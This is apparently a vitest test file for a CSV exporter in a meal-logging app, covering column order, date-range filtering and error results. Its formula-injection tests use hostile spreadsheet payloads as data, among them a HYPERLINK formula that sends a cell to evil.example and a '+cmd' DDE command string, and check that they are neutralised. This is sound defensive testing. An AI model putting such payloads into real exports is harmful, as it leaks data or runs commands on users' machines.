import {
  ALL_HISTORY_SCOPE,
  visibleDayScope,
  weekScope,
  type ExportResult,
  type PlateLog,
} from '@anc/core';
import { describe, expect, it } from 'vitest';
import {
  CSV_HEADER,
  MAX_CSV_FIELD_LENGTH,
  createCsvExporter,
  serializePlatesToCsv,
} from './csv-exporter';
import { FakeStore, entry, plate, splitCsvRow } from './testing';

const at = (d: number, h = 9): number => new Date(2026, 7, d, h).getTime();
const lines = (csv: string): string[] => csv.split('\n').filter((l) => l !== '');
const ids = async (p: Promise<ExportResult>): Promise<number[]> => {
  const r = await p;
  return r.kind === 'exportReady' ? r.plates.map((x) => x.id) : [];
};

describe('serializePlatesToCsv', () => {
  it('header is the documented column order', () => {
    const csv = serializePlatesToCsv([]);
    expect(csv.startsWith(CSV_HEADER)).toBe(true);
    expect(csv.endsWith('\n')).toBe(true);
  });

  it('empty history is a header-only file', () => {
    expect(lines(serializePlatesToCsv([]))).toEqual([CSV_HEADER]);
  });

  it('one plate one entry is a header plus one row (UTC, ms precision)', () => {
    const csv = serializePlatesToCsv([
      plate(1, Date.UTC(2026, 7, 16, 9), [entry(1, 1, 'Oatmeal')]),
    ]);
    const l = lines(csv);
    expect(l).toHaveLength(2);
    expect(l[1]).toContain('Oatmeal');
    expect(l[1]).toContain('2026-08-16T09:00:00.000Z');
  });

  it('one plate two entries is two rows', () => {
    const csv = serializePlatesToCsv([plate(1, at(16), [entry(1, 1, 'A'), entry(2, 1, 'B')])]);
    expect(lines(csv)).toHaveLength(3);
  });

  it('food_group is the LAST column and round-trips the group', () => {
    expect(CSV_HEADER.endsWith(',food_group')).toBe(true);
    const csv = serializePlatesToCsv([
      plate(1, at(16), [entry(1, 1, 'Egg', { group: 'protein', source: 'seed', ref: 'seed:egg' })]),
    ]);
    const cells = splitCsvRow(csv.split('\n')[1] as string);
    expect(cells).toHaveLength(CSV_HEADER.split(',').length);
    expect(cells.at(-1)).toBe('protein');
    expect(cells[3]).toBe('seed');
  });

  describe('formula injection', () => {
    const row = (e: ReturnType<typeof entry>): string =>
      serializePlatesToCsv([plate(1, at(16), [e])]).slice(CSV_HEADER.length + 1);
    const nameCell = (name: string): string =>
      splitCsvRow(row(entry(1, 1, name)).trimEnd())[5] as string;

    it('=HYPERLINK(...) is neutralised with a leading apostrophe and quoted', () => {
      const r = row(entry(1, 1, '=HYPERLINK("http://evil.example/?x="&A1,"click")'));
      expect(r).toContain('"\'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"');
      expect(r).not.toContain(',=HYPERLINK');
      expect(r).not.toContain('"=HYPERLINK');
    });

    it.each(["+cmd|' /C calc'!A0", '@SUM(1+1)', '-2+3', '\t=1+1', '\r=1+1', '=1+1'])(
      'prefix %j is neutralised',
      (name) => {
        const cell = nameCell(name);
        expect(cell.startsWith("'")).toBe(true);
        expect(cell.slice(1)).toBe(name);
      },
    );

    it('every TEXT column is neutralised (ref, unit, label)', () => {
      const cells = splitCsvRow(
        row(entry(1, 1, 'ok', { ref: '=ref', unit: '@unit', label: '+label' })).trimEnd(),
      );
      expect(cells[4]).toBe("'=ref");
      expect(cells[8]).toBe("'@unit");
      expect(cells[9]).toBe("'+label");
    });

    it('numeric quantity columns stay plain numbers', () => {
      const r = row(entry(1, 1, 'ok', { low: 0, high: 0.5 }));
      const cells = splitCsvRow(r.trimEnd());
      expect(cells[6]).toBe('0');
      expect(cells[7]).toBe('0.5');
      expect(r).not.toContain("'0");
      // A real negative is a number, not text (the type forbids it, the writer still must not quote it).
      const neg = splitCsvRow(row(entry(1, 1, 'ok', { low: -2, high: 3 })).trimEnd());
      expect(neg[6]).toBe('-2');
    });

    it('ordinary text and hyphens inside the text are untouched', () => {
      const cells = splitCsvRow(row(entry(1, 1, 'Rice - brown', { label: '1–2 fists' })).trimEnd());
      expect(cells[5]).toBe('Rice - brown');
      expect(cells[9]).toBe('1–2 fists');
    });

    it.each([' =1+1', '  +cmd', ' @SUM(A1)', '\n=1+1'])(
      'whitespace before the operator does not hide a formula (%j)',
      (name) => {
        expect(nameCell(name).startsWith("'")).toBe(true);
      },
    );

    it.each(['＝1+1', '＋cmd', '－2', '＠SUM(A1)', ' ＝1'])(
      'full-width operator %j is neutralised',
      (name) => {
        expect(nameCell(name).startsWith("'")).toBe(true);
      },
    );

    it('fields containing ; or TAB are quoted', () => {
      expect(row(entry(1, 1, 'a;b'))).toContain('"a;b"');
      expect(row(entry(1, 1, 'a\tb'))).toContain('"a\tb"');
    });

    it('a field containing CR is quoted', () => {
      expect(row(entry(1, 1, 'a\rb'))).toContain('"a\rb"');
    });

    it('field length is capped at 1000 characters', () => {
      expect(nameCell('x'.repeat(5000))).toHaveLength(MAX_CSV_FIELD_LENGTH);
    });

    it('the cap counts characters, not UTF-16 units', () => {
      const cell = nameCell('😀'.repeat(1500));
      expect(Array.from(cell)).toHaveLength(MAX_CSV_FIELD_LENGTH);
    });
  });
});

describe('CsvExporter', () => {
  const plates = (): PlateLog[] => [
    plate(1, at(10), [entry(1, 1, 'Before')]),
    plate(2, at(11), [entry(2, 2, 'Start')]),
    plate(3, at(16), [entry(3, 3, 'Day')]),
    plate(4, at(17), [entry(4, 4, 'End')]),
    plate(5, at(18), [entry(5, 5, 'After')]),
  ];

  it('visibleDay filters to the local day', async () => {
    const ex = createCsvExporter(new FakeStore(plates()));
    expect(await ids(ex.readPlates({ scope: visibleDayScope(at(16, 15)) }))).toEqual([3]);
  });

  it('week filters to seven local days, newest first', async () => {
    const ex = createCsvExporter(new FakeStore(plates()));
    expect(await ids(ex.readPlates({ scope: weekScope(at(11, 0)) }))).toEqual([4, 3, 2]);
  });

  it('allHistory returns the full list', async () => {
    const ex = createCsvExporter(new FakeStore(plates()));
    expect(await ids(ex.readPlates({ scope: ALL_HISTORY_SCOPE }))).toHaveLength(5);
  });

  it('the range read is bounded in the store, not filtered after', async () => {
    const store = new FakeStore();
    await createCsvExporter(store).readPlates({
      scope: visibleDayScope(new Date(2026, 2, 29, 15).getTime()),
    });
    expect(store.lastRange).toEqual({
      from: new Date(2026, 2, 29).getTime(),
      to: new Date(2026, 2, 30).getTime(),
    });
  });

  it('allHistory reads with open bounds', async () => {
    const store = new FakeStore();
    await createCsvExporter(store).readPlates({ scope: ALL_HISTORY_SCOPE });
    expect(store.lastRange).toEqual({ from: undefined, to: undefined });
  });

  it('a locked store is storeClosed, any other failure is exportReadFailed', async () => {
    const locked = createCsvExporter(new FakeStore([], 'webSessionKey'));
    expect((await locked.readPlates({ scope: ALL_HISTORY_SCOPE })).kind).toBe('storeClosed');
    const broken = createCsvExporter(new FakeStore([], 'storeOperation'));
    expect((await broken.readPlates({ scope: ALL_HISTORY_SCOPE })).kind).toBe('exportReadFailed');
  });

  it('streamPlates emits exportReady for csv', async () => {
    const ex = createCsvExporter(new FakeStore([plate(1, at(16), [entry(1, 1, 'A')])]));
    const out: string[] = [];
    for await (const r of ex.streamPlates({ format: 'csv', scope: ALL_HISTORY_SCOPE }))
      out.push(r.kind);
    expect(out).toEqual(['exportReady']);
  });

  it('streamPlates emits exportFormatFailure for json', async () => {
    const ex = createCsvExporter(new FakeStore());
    const out: string[] = [];
    for await (const r of ex.streamPlates({ format: 'json', scope: ALL_HISTORY_SCOPE }))
      out.push(r.kind);
    expect(out).toEqual(['exportFormatFailure']);
  });
});
